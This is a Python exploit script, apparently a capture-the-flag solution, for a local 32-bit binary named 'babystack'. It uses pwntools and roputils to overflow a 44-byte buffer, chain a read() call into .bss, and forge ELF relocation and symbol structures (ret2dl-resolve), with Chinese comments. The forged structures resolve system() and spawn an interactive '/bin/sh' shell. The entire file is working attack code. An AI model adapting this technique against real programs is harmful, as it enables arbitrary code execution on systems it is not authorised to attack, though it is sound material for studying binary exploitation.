#!/usr/bin/env python
#coding:utf-8
#import sys
import roputils
from pwn import *
 
offset = 44 # buf -> ret_addr
readplt = 0x08048300 # read_addr
bss = 0x0804a020 # bss_addr
vulFunc = 0x0804843B # main
 
p = process('./babystack')
 
rop = roputils.ROP('./babystack')
addr_bss = rop.section('.bss')
 
# step1 : write sh & resolve struct to bss
buf1 = 'A' * offset #44
buf1 += p32(readplt) + p32(vulFunc) + p32(0) + p32(addr_bss) + p32(100)
p.send(buf1)
 
buf2 =  rop.string('/bin/sh')
buf2 += rop.fill(20, buf2)
buf2 += rop.dl_resolve_data(addr_bss+20, 'system')   #在bss段伪造Elf32_Rel 和 Elf32_Sym
buf2 += rop.fill(100, buf2)
p.send(buf2)
 
buf3 = 'A'*44 + rop.dl_resolve_call(addr_bss+20, addr_bss) #劫持eip至plt[0]，解析system
p.send(buf3)
p.interactive()
